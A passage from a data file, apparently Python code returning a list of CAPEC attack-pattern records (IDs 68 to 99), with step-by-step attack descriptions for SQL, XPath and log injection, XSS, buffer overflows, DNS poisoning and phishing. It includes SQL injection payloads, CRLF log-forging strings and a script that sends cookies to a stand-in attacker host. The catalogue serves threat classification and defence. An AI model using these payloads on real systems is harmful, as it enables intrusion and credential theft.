        "id": 565,
        "capec_id": "68"
    },
    {
        "id": 566,
        "capec_id": "680"
    },
    {
        "id": 567,
        "capec_id": "681"
    },
    {
        "id": 568,
        "capec_id": "69",
        "step1": " [Find programs with elevated priveleges] The adversary probes for programs running with elevated privileges.. - Look for programs that write to the system directories or registry keys (such as HKLM, which stores a number of critical Windows environment variables). These programs are typically running with elevated privileges and have usually not been designed with security in mind. Such programs are excellent exploit targets because they yield lots of power when they break. ",
        "step2": " [Find vulnerability in running program] The adversary looks for a vulnerability in the running program that would allow for arbitrary code execution with the privilege of the running program.. - Look for improper input validation. - Look for improper failure safety. For instance when a program fails it may authorize restricted access to anyone.. - Look for a buffer overflow which may be exploited if an adversary can inject unvalidated data. ",
        "step3": " [Execute arbitrary code] The adversary exploits the vulnerability that they have found. For instance, they can try to inject and execute arbitrary code or write to OS resources.\n"
    },
    {
        "id": 569,
        "capec_id": "7",
        "step1": " [Hypothesize SQL queries in application]Generated hypotheses regarding the SQL queries in an application. For example, the adversary may hypothesize that their input is passed directly into a query that looks like: SELECT * FROM orders WHERE ordernum = _____orSELECT * FROM orders WHERE ordernum IN (_____)orSELECT * FROM orders WHERE ordernum in (_____) ORDER BY _____ Of course, there are many other possibilities.. - Research types of SQL queries and determine which ones could be used at various places in an application. ",
        "step2": " [Determine how to inject information into the queries]Determine how to inject information into the queries from the previous step such that the injection does not impact their logic. For example, the following are possible injections for those queries: 5' OR 1=1; --and5) OR 1=1; --andordernum DESC; --. - Add clauses to the SQL queries such that the query logic does not change.. - Add delays to the SQL queries in case server does not provide clear error messages (e.g. WAITFOR DELAY '0:0:10' in SQL Server or BENCHMARK(1000000000,MD5(1) in MySQL). If these can be injected into the queries, then the length of time that the server takes to respond reveals whether the query is injectable or not. ",
        "step3": " [Determine user-controllable input susceptible to injection] Determine the user-controllable input susceptible to injection. For each user-controllable input that the adversary suspects is vulnerable to SQL injection, attempt to inject the values determined in the previous step. If an error does not occur, then the adversary knows that the SQL injection was successful.. - Use web browser to inject input through text fields or through HTTP GET parameters.. - Use a web application debugging tool such as Tamper Data, TamperIE, WebScarab,etc. to modify HTTP POST parameters, hidden fields, non-freeform fields, etc.. - Use network-level packet injection tools such as netcat to inject input. - Use modified client (modified by reverse engineering) to inject input. ",
        "step4": " [Determine database type] Determines the type of the database, such as MS SQL Server or Oracle or MySQL, using logical conditions as part of the injected queries. - Try injecting a string containing char(0x31)=char(0x31) (this evaluates to 1=1 in SQL Server only). - Try injecting a string containing 0x313D31 (this evaluates to 1=1 in MySQL only). - Inject other database-specific commands into input fields susceptible to SQL Injection. The adversary can determine the type of database that is running by checking whether the query executed successfully or not (i.e. whether the adversary received a normal response from the server or not). ",
        "step5": " [Extract information about database schema] Extract information about database schema by getting the database to answer yes/no questions about the schema.. - Automatically extract database schema using a tool such as Absinthe.. - Manually perform the blind SQL Injection to extract desired information about the database schema. ",
        "step6": " [Exploit SQL Injection vulnerability] Use the information obtained in the previous steps to successfully inject the database in order to bypass checks or modify, add, retrieve or delete data from the database. - Use information about how to inject commands into SQL queries as well as information about the database schema to execute attacks such as dropping tables, inserting records, etc.\n"
    },
    {
        "id": 570,
        "capec_id": "70"
    },
    {
        "id": 571,
        "capec_id": "71",
        "step1": " [Survey the application for user-controllable inputs] Using a browser or an automated tool, an attacker follows all public links and actions on a web site. They record all the links, the forms, the resources accessed and all other potential entry-points for the web application.. - Use a spidering tool to follow and record all links and analyze the web pages to find entry points. Make special note of any links that include parameters in the URL.. - Use a proxy tool to record all user input entry points visited during a manual traversal of the web application.. - Use a browser to manually explore the website and analyze how it is constructed. Many browsers' plugins are available to facilitate the analysis or automate the discovery. ",
        "step2": " [Probe entry points to locate vulnerabilities] The attacker uses the entry points gathered in the Explore phase as a target list and injects various Unicode encoded payloads to determine if an entry point actually represents a vulnerability with insufficient validation logic and to characterize the extent to which the vulnerability can be exploited.. - Try to use Unicode encoding of content in Scripts in order to bypass validation routines.. - Try to use Unicode encoding of content in HTML in order to bypass validation routines.. - Try to use Unicode encoding of content in CSS in order to bypass validation routines.\n"
    },
    {
        "id": 572,
        "capec_id": "72",
        "step1": " [Survey web application for URLs with parameters] Using a browser, an automated tool or by inspecting the application, an adversary records all URLs that contain parameters.. - Use a spidering tool to follow and record all links and analyze the web pages to find entry points. Make special note of any links that include parameters in the URL. ",
        "step2": " [Probe URLs to locate vulnerabilities] The adversary uses the URLs gathered in the Explore phase as a target list and tests parameters with different encodings of special characters to see how the web application will handle them.. - Use URL encodings of special characters such as semi-colons, backslashes, or question marks that might be filtered out normally.. - Combine the use of URL encodings with other encoding techniques such as the triple dot and escape slashes. ",
        "step3": " [Inject special characters into URL parameters] Using the information gathered in the Experiment phase, the adversary injects special characters into the URL using URL encoding. This can lead to path traversal, cross-site scripting, SQL injection, etc.\n"
    },
    {
        "id": 573,
        "capec_id": "73"
    },
    {
        "id": 574,
        "capec_id": "74",
        "step1": " Adversary determines the nature of state management employed by the target. This includes determining the location (client-side, server-side or both applications) and possibly the items stored as part of user state. ",
        "step2": " The adversary now tries to modify the user state contents (possibly indiscriminately if the contents are encrypted or otherwise obfuscated) or cause a state transition and observe the effects of this change on the target. ",
        "step3": " Having determined how to manipulate the state, the adversary can perform illegitimate actions.\n"
    },
    {
        "id": 575,
        "capec_id": "75"
    },
    {
        "id": 576,
        "capec_id": "76",
        "step1": " [Fingerprinting of the operating system] In order to create a valid file injection, the attacker needs to know what the underlying OS is so that the proper file seperator is used.. - Port mapping. Identify ports that the system is listening on, and attempt to identify inputs and protocol types on those ports.. - TCP/IP Fingerprinting. The attacker uses various software to make connections or partial connections and observe idiosyncratic responses from the operating system. Using those responses, they attempt to guess the actual operating system.. - Induce errors to find informative error messages ",
        "step2": " [Survey the Application to Identify User-controllable Inputs] The attacker surveys the target application to identify all user-controllable inputs, possibly as a valid and authenticated user. - Spider web sites for all available links, entry points to the web site.. - Manually explore application and inventory all application inputs ",
        "step3": " [Vary inputs, looking for malicious results] Depending on whether the application being exploited is a remote or local one, the attacker crafts the appropriate malicious input containing the path of the targeted file or other file system control syntax to be passed to the application. - Inject context-appropriate malicious file path using network packet injection tools (netcat, nemesis, etc.). - Inject context-appropriate malicious file path using web test frameworks (proxies, TamperData, custom programs, etc.) or simple HTTP requests. - Inject context-appropriate malicious file system control syntax ",
        "step4": " [Manipulate files accessible by the application] The attacker may steal information or directly manipulate files (delete, copy, flush, etc.). - The attacker injects context-appropriate malicious file path to access the content of the targeted file.. - The attacker injects context-appropriate malicious file system control syntax to access the content of the targeted file.. - The attacker injects context-appropriate malicious file path to cause the application to create, delete a targeted file.. - The attacker injects context-appropriate malicious file system control syntax to cause the application to create, delete a targeted file.. - The attacker injects context-appropriate malicious file path in order to manipulate the meta-data of the targeted file.. - The attacker injects context-appropriate malicious file system control syntax in order to manipulate the meta-data of the targeted file.\n"
    },
    {
        "id": 577,
        "capec_id": "77",
        "step1": " [Probe target application] The adversary first probes the target application to determine important information about the target. This information could include types software used, software versions, what user input the application consumes, and so on. ",
        "step2": " [Find user-controlled variables] Using the information found by probing the application, the adversary attempts to manipulate many user-controlled variables and observes the effects on the application. If the adversary notices any significant changes to the application, they will know that a certain variable is useful to the application.. - Adversaries will try to alter many common variable names such as count, tempFile, i, etc. The hope is that they can alter the flow of the application without knowing the inner-workings.. - Adversaries will try to alter known environment variables. ",
        "step3": " [Manipulate user-controlled variables] Once the adversary has found a user-controller variable(s) that is important to the application, they will manipulate it to change the normal behavior in a way that benefits the adversary.\n"
    },
    {
        "id": 578,
        "capec_id": "78",
        "step1": " [Survey the application for user-controllable inputs] Using a browser, an automated tool or by inspecting the application, an adversary records all entry points to the application.. - Use a spidering tool to follow and record all links and analyze the web pages to find entry points. Make special note of any links that include parameters in the URL.. - Use a proxy tool to record all user input entry points visited during a manual traversal of the web application.. - Use a browser to manually explore the website and analyze how it is constructed. Many browsers' plugins are available to facilitate the analysis or automate the discovery.. - Manually inspect the application to find entry points. ",
        "step2": " [Probe entry points to locate vulnerabilities] The adversary uses the entry points gathered in the Explore phase as a target list and attempts to escape multiple different special characters using a backslash.. - Escape a special character with a backslash to bypass input validation.. - Try different encodings of both the backslash and the special character to see if this bypasses input validation ",
        "step3": " [Manipulate input] Once the adversary determines how to bypass filters that filter out special characters using an escaped slash, they will manipulate the user input in a way that is not intended by the application.\n"
    },
    {
        "id": 579,
        "capec_id": "79",
        "step1": " [Survey the application for user-controllable inputs] Using a browser, an automated tool or by inspecting the application, an adversary records all entry points to the application.. - Use a spidering tool to follow and record all links and analyze the web pages to find entry points. Make special note of any links that include parameters in the URL.. - Use a proxy tool to record all user input entry points visited during a manual traversal of the web application.. - Use a browser to manually explore the website and analyze how it is constructed. Many browsers' plugins are available to facilitate the analysis or automate the discovery.. - Manually inspect the application to find entry points. ",
        "step2": " [Probe entry points to locate vulnerabilities] The adversary uses the entry points gathered in the Explore phase as a target list and looks for areas where user input is used to access resources on the target host. The adversary attempts different encodings of slash characters to bypass input filters.. - Try both backslash and forward slash characters. - Try different encodings for slash characters such as %5C ",
        "step3": " [Traverse application directories] Once the adversary determines how to bypass filters that filter out slash characters, they will manipulate the user input to include slashes in order to traverse directories and access resources that are not intended for the user.\n"
    },
    {
        "id": 580,
        "capec_id": "8",
        "step1": " [Identify target application] The adversary, with knowledge of vulnerable libraries or shared code modules, identifies a target application or program that makes use of these. ",
        "step2": " [Find injection vector] The adversary attempts to use the API, and if they can they send a large amount of data to see if the buffer overflow attack really does work.. - Provide large input to a program or application and observe the behavior. If there is a crash, this means that a buffer overflow attack is possible. ",
        "step3": " [Craft overflow content] The adversary crafts the content to be injected based on their knowledge of the vulnerability and their desired outcome. If the intent is to simply cause the software to crash, the content need only consist of an excessive quantity of random data. If the intent is to leverage the overflow for execution of arbitrary code, the adversary will craft a set of content that not only overflows the targeted buffer but does so in such a way that the overwritten return address is replaced with one of the adversaries' choosing which points to code injected by the adversary.. - Create malicious shellcode that will execute when the program execution is returned to it.. - Use a NOP-sled in the overflow content to more easily slide into the malicious code. This is done so that the exact return address need not be correct, only in the range of all of the NOPs ",
        "step4": " [Overflow the buffer] Using the API as the injection vector, the adversary injects the crafted overflow content into the buffer.\n"
    },
    {
        "id": 581,
        "capec_id": "80",
        "step1": " [Survey the application for user-controllable inputs] Using a browser or an automated tool, an attacker follows all public links and actions on a web site. They record all the links, the forms, the resources accessed and all other potential entry-points for the web application.. - Use a spidering tool to follow and record all links and analyze the web pages to find entry points. Make special note of any links that include parameters in the URL.. - Use a proxy tool to record all user input entry points visited during a manual traversal of the web application.. - Use a browser to manually explore the website and analyze how it is constructed. Many browsers' plugins are available to facilitate the analysis or automate the discovery. ",
        "step2": " [Probe entry points to locate vulnerabilities] The attacker uses the entry points gathered in the Explore phase as a target list and injects various UTF-8 encoded payloads to determine if an entry point actually represents a vulnerability with insufficient validation logic and to characterize the extent to which the vulnerability can be exploited.. - Try to use UTF-8 encoding of content in Scripts in order to bypass validation routines.. - Try to use UTF-8 encoding of content in HTML in order to bypass validation routines.. - Try to use UTF-8 encoding of content in CSS in order to bypass validation routines.\n"
    },
    {
        "id": 582,
        "capec_id": "81",
        "step1": " [Determine Application Web Server Log File Format] The attacker observes the system and looks for indicators of which logging utility is being used by the web server.. - Determine logging utility being used by application web server (e.g. log4j), only possible if the application is known by the attacker or if the application returns error messages with logging utility information. ",
        "step2": " [Determine Injectable Content] The attacker launches various logged actions with malicious data to determine what sort of log injection is possible.. - Attacker triggers logged actions with maliciously crafted data as inputs, parameters, arguments, etc. ",
        "step3": " [Manipulate Log Files] The attacker alters the log contents either directly through manipulation or forging or indirectly through injection of specially crafted request that the web server will receive and write into the logs. This type of attack typically follows another attack and is used to try to cover the traces of the previous attack.. - Indirectly through injection, use carriage return and/or line feed characters to start a new line in the log file, and then, add a fake entry. For example: The HTTP request for /index.html%0A%0DIP_ADDRESS- - DATE_FORMAT] GET /forged-path HTTP/1.1 200 - - USER_AGENT may add the log line into Apache access_log (for example). Different applications may require different encodings of the carriage return and line feed characters.. - Directly through log file or database manipulation, use carriage return and/or line feed characters to start a new line in the log file, and then, add a fake entry. For example: The HTTP request for /index.html%0A%0DIP_ADDRESS- - DATE_FORMAT] GET /forged-path HTTP/1.1 200 - - USER_AGENT may add the log line into Apache access_log (for example). Different applications may require different encodings of the carriage return and line feed characters.. - Directly through log file or database manipulation, modify existing log entries.\n"
    },
    {
        "id": 583,
        "capec_id": "82"
    },
    {
        "id": 584,
        "capec_id": "83",
        "step1": " [Survey the target] Using a browser or an automated tool, an adversary records all instances of user-controllable input used to contruct XPath queries.. - Use an automated tool to record all instances of user-controllable input used to contruct XPath queries.. - Use a browser to manually explore the website and analyze how the application processes inputs. ",
        "step2": " [Determine the tructure of queries] Using manual or automated means, test inputs found for XPath weaknesses.. - Use an automated tool automatically probe the inputs for XPath weaknesses.. - Manually probe the inputs using characters such as single quote (') that can cause XPath-releated errors, thus indicating an XPath weakness. ",
        "step3": " [Inject content into XPath query] Craft malicious content containing XPath expressions that is not validated by the application and is executed as part of the XPath queries.. - Use the crafted input to execute unexpected queries that can disclose sensitive database information to the attacker.. - Use a combination of single quote (') and boolean expressions such as or 1=1 to manipulate XPath logic.. - Use XPath functions in the malicious content such as string-length, substring, or count to gain information about the XML document structure being used.\n"
    },
    {
        "id": 585,
        "capec_id": "84",
        "step1": " [Survey the application for user-controllable inputs] Using a browser or an automated tool, an attacker follows all public links and actions on a web site. They record all the links, the forms, the resources accessed and all other potential entry-points for the web application.. - Use a spidering tool to follow and record all links and analyze the web pages to find entry points. Make special note of any links that include parameters in the URL.. - Use a proxy tool to record all user input entry points visited during a manual traversal of the web application.. - Use a browser to manually explore the website and analyze how it is constructed. Many browsers' plugins are available to facilitate the analysis or automate the discovery. ",
        "step2": " [Determine user-controllable input susceptible to injection] Determine the user-controllable input susceptible to injection. For each user-controllable input that the attacker suspects is vulnerable to XQL injection, attempt to inject characters that have special meaning in XQL. The goal is to create an XQL query with an invalid syntax.. - Use web browser to inject input through text fields or through HTTP GET parameters.. - Use a web application debugging tool such as Tamper Data, TamperIE, WebScarab,etc. to modify HTTP POST parameters, hidden fields, non-freeform fields, etc.. - Use XML files to inject input.. - Use network-level packet injection tools such as netcat to inject input. - Use modified client (modified by reverse engineering) to inject input. ",
        "step3": " [Information Disclosure] The attacker crafts and injects an XQuery payload which is acted on by an XQL query leading to inappropriate disclosure of information.. - Leveraging one of the vulnerable inputs identified during the Experiment phase, inject malicious XQuery payload. The payload aims to get information on the structure of the underlying XML database and/or the content in it. ",
        "step4": " [Manipulate the data in the XML database] The attacker crafts and injects an XQuery payload which is acted on by an XQL query leading to modification of application data.. - Leveraging one of the vulnerable inputs identified during the Experiment phase, inject malicious XQuery payload.. The payload tries to insert or replace data in the XML database.\n"
    },
    {
        "id": 586,
        "capec_id": "85",
        "step1": " [Send request to target webpage and analyze HTML] Using a browser or an automated tool, an adversary sends requests to a webpage and records the received HTML response. Adversaries then analyze the HTML to identify any known underlying JavaScript architectures. This can aid in mappiong publicly known vulnerabilities to the webpage and can also helpo the adversary guess application architecture and the inner workings of a system.. - Record all src values inside script tags. These JavaScript files are compared to lists of files for known architectures. If there is a large match between the src values and architecture files, then it can be assumed that particular architecture is being used.\n"
    },
    {
        "id": 587,
        "capec_id": "86",
        "step1": " [Survey the application for public links] Using a browser or an automated tool, an adversary follows all public links on a web site. They record all the entry points (input) that becomes part of generated HTTP header (not only GET/POST/COOKIE, but also Content-Type, etc.). - Use a spidering tool to follow and record all links and analyze the web pages to find entry points. Make special note of any links that include parameters used in the HTTP headers.. - Look for HTML meta tags that could be injectable. - Use a proxy tool to record all links visited during a manual traversal of the web application.. - Use a browser to manually explore the website and analyze how it is constructed. Many browsers' plugins are available to facilitate the analysis or automate the discovery. ",
        "step2": " [Probe identified potential entry points for XSS vulnerability]The adversary uses the entry points gathered in the Explore phase as a target list and injects various common script payloads to determine if an entry point actually represents a vulnerability and to characterize the extent to which the vulnerability can be exploited. They record all the responses from the server that include unmodified versions of their script. The adversary tries also to inject extra-parameter to the HTTP request to see if they are reflected back in the web page or in the HTTP response.. - Manually inject various script payloads into each identified entry point using a list of common script injection probes and observe system behavior to determine if script was executed.. - Use an automated injection attack tool to inject various script payloads into each identified entry point using a list of common script injection probes and observe system behavior to determine if script was executed.. - Use a proxy tool to record results of manual input of XSS probes in known URLs. ",
        "step3": " [Craft malicious XSS URL] Once the adversary has determined which parameters are vulnerable to XSS, they will craft a malicious URL containing the XSS exploit. The adversary can have many goals, from stealing session IDs, cookies, credentials, and page content from the victim.. - Change a URL parameter which is used in an HTTP header to include a malicious script tag. Because it is in the header it may bypass validation.. - Send information gathered from the malicious script to a remote endpoint. ",
        "step4": " [Get victim to click URL] In order for the attack to be successful, the victim needs to access the malicious URL.. - Send a phishing email to the victim containing the malicious URL. This can be hidden in a hyperlink as to not show the full URL, which might draw suspicion.. - Put the malicious URL on a public forum, where many victims might accidentally click the link.\n"
    },
    {
        "id": 588,
        "capec_id": "87",
        "step1": " [Spider] Using an automated tool, an attacker follows all public links on a web site. They record all the links they find.. - Use a spidering tool to follow and record all links.. - Use a proxy tool to record all links visited during a manual traversal of the web application. ",
        "step2": " [Attempt well-known or guessable resource locations] Using an automated tool, an attacker requests a variety of well-known URLs that correspond to administrative, debugging, or other useful internal actions. They record all the positive responses from the server.. - Use a spidering tool to follow and record attempts on well-known URLs.. - Use a proxy tool to record all links visited during a manual traversal of attempts on well-known URLs. ",
        "step3": " [Use unauthorized resources] By visiting the unprotected resource, the attacker makes use of unauthorized functionality.. - Access unprotected functions and execute them. ",
        "step4": " [View unauthorized data] The attacker discovers and views unprotected sensitive data.. - Direct request of protected pages that directly access database back-ends. (e.g., list.jsp, accounts.jsp, status.jsp, etc.).\n"
    },
    {
        "id": 589,
        "capec_id": "88",
        "step1": " [Identify inputs for OS commands] The attacker determines user controllable input that gets passed as part of a command to the underlying operating system.. - Port mapping. Identify ports that the system is listening on, and attempt to identify inputs and protocol types on those ports.. - TCP/IP Fingerprinting. The attacker uses various software to make connections or partial connections and observe idiosyncratic responses from the operating system. Using those responses, they attempt to guess the actual operating system.. - Induce errors to find informative error messages ",
        "step2": " [Survey the Application] The attacker surveys the target application, possibly as a valid and authenticated user. - Spidering web sites for all available links. - Inventory all application inputs ",
        "step3": " [Vary inputs, looking for malicious results.] Depending on whether the application being exploited is a remote or local one the attacker crafts the appropriate malicious input, containing OS commands, to be passed to the application. - Inject command delimiters using network packet injection tools (netcat, nemesis, etc.). - Inject command delimiters using web test frameworks (proxies, TamperData, custom programs, etc.) ",
        "step4": " [Execute malicious commands] The attacker may steal information, install a back door access mechanism, elevate privileges or compromise the system in some other way.. - The attacker executes a command that stores sensitive information into a location where they can retrieve it later (perhaps using a different command injection).\n"
    },
    {
        "id": 590,
        "capec_id": "89",
        "step1": " :Attacker sets up a system mocking the one trusted by the users. This is usually a website that requires or handles sensitive information. ",
        "step2": " The attacker then poisons the resolver for the targeted site. This is achieved by poisoning the DNS server, or the local hosts file, that directs the user to the original website ",
        "step3": " When the victim requests the URL for the site, the poisoned records direct the victim to the attackers' system rather than the original one. ",
        "step4": " Because of the identical nature of the original site and the attacker controlled one, and the fact that the URL is still the original one, the victim trusts the website reached and the attacker can now farm sensitive information such as credentials or account numbers.\n"
    },
    {
        "id": 591,
        "capec_id": "9",
        "step1": " [Identify target system] The adversary first finds a target system that they want to gain elevated priveleges on. This could be a system they already have some level of access to or a system that they will gain unauthorized access at a lower privelege using some other means. ",
        "step2": " [Find injection vector] The adversary identifies command line utilities exposed by the target host that contain buffer overflow vulnerabilites. The adversary likely knows which utilities have these vulnerabilities and what the effected versions are, so they will also obtain version numbers for these utilities. ",
        "step3": " [Craft overflow command] Once the adversary has found a vulnerable utility, they will use their knownledge of the vulnerabilty to create the command that will exploit the buffer overflow. ",
        "step4": " [Overflow the buffer] Using the injection vector, the adversary executes the crafted command, gaining elevated priveleges on the machine.\n"
    },
    {
        "id": 592,
        "capec_id": "90",
        "step1": " [Identify service with vulnerable handshake authentication] The adversary must first identify a vulnerable authentication protocol. The most common indication of an authentication protocol vulnerable to reflection attack is when the client initiates the handshake, rather than the server. This allows the client to get the server to encrypt targeted data using the server's pre-shared key. ",
        "step2": " [Send challenge to target server] The adversary opens a connection to the target server and sends it a challenge. This challenge is arbitrary and is simply used as a placeholder for the protocol in order to get the server to respond. ",
        "step3": " [Receive server challenge] The server responds by returning the challenge sent encrypted with the server's pre-shared key, as well as its own challenge to the attacker sent in plaintext. We will call this challenge sent by the server C. C is very important and is stored off by the adversary for the next step. ",
        "step4": " [Initiate second handshake] Since the adversary does not possess the pre-shared key, they cannot encrypt C from the previous step in order for the server to authenticate them. To get around this, the adversary initiates a second connection to the server while still keeping the first connection alive. In the second connection, the adversary sends C as the initial client challenge, which rather than being arbitary like the first connection, is very intentional. ",
        "step5": " [Receive encrypted challenge] The server treats the intial client challenge in connection two as an arbitrary client challenge and responds by encrypting C with the pre-shared key. The server also sends a new challenge. The adversary ignores the server challenge and stores the encrypted version of C. The second connection is either terminated or left to expire by the adversary as it is no longer needed. ",
        "step6": " The adversary now posseses the encrypted version of C that is obtained through connection two. The adversary continues the handshake in connection one by responding to the server with the encrypted version of C, verifying that they have access to the pre-shared key (when they actually do not). Because the server uses the same pre-shared key for all authentication it will decrypt C and authenticate the adversary for the first connection, giving the adversary illegitimate access to the target system.\n"
    },
    {
        "id": 593,
        "capec_id": "91"
    },
    {
        "id": 594,
        "capec_id": "92",
        "step1": " The first step is exploratory meaning the attacker looks for an integer variable that they can control. ",
        "step2": " The attacker finds an integer variable that they can write into or manipulate and try to get the value of the integer out of the possible range. ",
        "step3": " The integer variable is forced to have a value out of range which set its final value to an unexpected value. ",
        "step4": " The target host acts on the data and unexpected behavior may happen.\n"
    },
    {
        "id": 595,
        "capec_id": "93",
        "step1": " [Determine Application's Log File Format] The first step is exploratory meaning the attacker observes the system. The attacker looks for action and data that are likely to be logged. The attacker may be familiar with the log format of the system.. - Determine logging utility being used by application (e.g. log4j). - Gain access to application's source code to determine log file formats.. - Install or obtain access to instance of application and observe its log file format. ",
        "step2": " [Manipulate Log Files] The attacker alters the log contents either directly through manipulation or forging or indirectly through injection of specially crafted input that the target software will write to the logs. This type of attack typically follows another attack and is used to try to cover the traces of the previous attack.. - Use carriage return and/or line feed characters to start a new line in the log file, and then, add a fake entry. For example: %0D%0A[Thu%20Nov%2012%2011:22]:Info:%20User%20admin%20logged%20in may add the following forged entry into a log file: [Thu Nov 12 12:11:22]:Info: User admin logged in Different applications may require different encodings of the carriage return and line feed characters.. - Insert a script into the log file such that if it is viewed using a web browser, the attacker will get a copy of the operator/administrator's cookie and will be able to gain access as that user. For example, a log file entry could contain <script>new Image().src=http://xss.attacker.com/log_cookie?cookie=+encodeURI(document.cookie);</script> The script itself will be invisible to anybody viewing the logs in a web browser (unless they view the source for the page).\n"
    },
    {
        "id": 596,
        "capec_id": "94",
        "step1": " [Determine Communication Mechanism] The adversary determines the nature and mechanism of communication between two components, looking for opportunities to exploit.. - Perform a sniffing attack and observe communication to determine a communication protocol.. - Look for application documentation that might describe a communication mechanism used by a target. ",
        "step2": " [Position In Between Targets] The adversary inserts themself into the communication channel initially acting as a routing proxy between the two targeted components.. - Install spyware on a client that will intercept outgoing packets and route them to their destination as well as route incoming packets back to the client.. - Exploit a weakness in an encrypted communication mechanism to gain access to traffic. Look for outdated mechanisms such as SSL. ",
        "step3": " [Use Intercepted Data Maliciously] The adversary observes, filters, or alters passed data of its choosing to gain access to sensitive information or to manipulate the actions of the two target components for their own purposes.. - Prevent some messages from reaching their destination, causing a denial of service.\n"
    },
    {
        "id": 597,
        "capec_id": "95",
        "step1": " [Scan for WSDL Documents] The adversary scans for WSDL documents. The WDSL document written in XML is like a handbook on how to communicate with the web services provided by the target host. It provides an open view of the application (function details, purpose, functional break down, entry points, message types, etc.). This is very useful information for the adversary. ",
        "step2": " [Analyze WSDL files] An adversary will analyze the WSDL files and try to find potential weaknesses by sending messages matching the pattern described in the WSDL file. The adversary could run through all of the operations with different message request patterns until a breach is identified. ",
        "step3": " [Craft malicious content] Once an adversary finds a potential weakness, they can craft malicious content to be sent to the system. For instance the adversary may try to submit special characters and observe how the system reacts to an invalid request. The message sent by the adversary may not be XML validated and cause unexpected behavior.\n"
    },
    {
        "id": 598,
        "capec_id": "96",
        "step1": " Determine what external libraries the application accesses. ",
        "step2": " Block access to the external libraries accessed by the application. ",
        "step3": " Monitor the behavior of the system to see if it goes into an insecure/inconsistent state. ",
        "step4": " If the system does go into an insecure/inconsistent state, leverage that to obtain information about the system functionality or data, elevate access control, etc. The rest of this attack will depend on the context and the desired goal.\n"
    },
    {
        "id": 599,
        "capec_id": "97",
        "step1": " An attacker discovers a weakness in the cryptographic algorithm or a weakness in how it was applied to a particular chunk of plaintext. ",
        "step2": " An attacker leverages the discovered weakness to decrypt, partially decrypt or infer some information about the contents of the encrypted message. All of that is done without knowing the secret key.\n"
    },
    {
        "id": 600,
        "capec_id": "98",
        "step1": " [Obtain domain name and certificate to spoof legitimate site] This optional step can be used to help the attacker impersonate the legitimate site more convincingly. The attacker can use homograph attacks to convince users that they are using the legitimate website. Note that this step is not required for phishing attacks, and many phishing attacks simply supply URLs containing an IP address and no SSL certificate.. - Optionally obtain a domain name that visually looks similar to the legitimate site's domain name. An example is www.paypaI.com vs. www.paypal.com (the first one contains a capital i, instead of a lower case L). - Optionally obtain a legitimate SSL certificate for the new domain name. ",
        "step2": " [Explore legitimate website and create duplicate] An attacker creates a website (optionally at a URL that looks similar to the original URL) that closely resembles the website that they are trying to impersonate. That website will typically have a login form for the victim to put in their authentication credentials. There can be different variations on a theme here.. - Use spidering software to get copy of web pages on legitimate site.. - Manually save copies of required web pages from legitimate site.. - Create new web pages that have the legitimate site's look and feel, but contain completely new content. ",
        "step3": " [Convince user to enter sensitive information on attacker's site.] An attacker sends an e-mail to the victim that has some sort of a call to action to get the user to click on the link included in the e-mail (which takes the victim to attacker's website) and log in. The key is to get the victim to believe that the e-mail is coming from a legitimate entity with which the victim does business and that the website pointed to by the URL in the e-mail is the legitimate website. A call to action will usually need to sound legitimate and urgent enough to prompt action from the user.. - Send the user a message from a spoofed legitimate-looking e-mail address that asks the user to click on the included link.. - Place phishing link in post to online forum. ",
        "step4": " [Use stolen credentials to log into legitimate site] Once the attacker captures some sensitive information through phishing (login credentials, credit card information, etc.) the attacker can leverage this information. For instance, the attacker can use the victim's login credentials to log into their bank account and transfer money to an account of their choice.. - Log in to the legitimate site using another user's supplied credentials.\n"
    },
    {
        "id": 601,
        "capec_id": "99"
    }
]
    return data